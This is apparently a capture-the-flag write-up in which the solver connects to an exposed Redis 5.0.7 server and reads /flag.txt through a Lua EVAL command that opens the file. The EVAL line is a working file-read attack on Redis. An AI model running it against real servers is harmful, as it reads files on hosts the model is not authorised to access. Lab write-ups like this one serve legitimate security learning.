...
## Solution
When opening the site it showed us this.
![image](https://github.com/user-attachments/assets/29d82837-7ee7-4b8f-bfd6-201664eaff32)

we open it with `redis-cli -h 172.105.121.246 -p 6379` and print `info`
```
redis_version:5.0.7
...
214) "0.0.0.0"
```
Then using this command: `EVAL "local f=io.open('/flag.txt', 'r'); local c=f:read('*a'); f:close(); return c" 0` we get the flag.
![image](https://github.com/user-attachments/assets/63de898b-9948-40cc-b3b1-279822512d88)
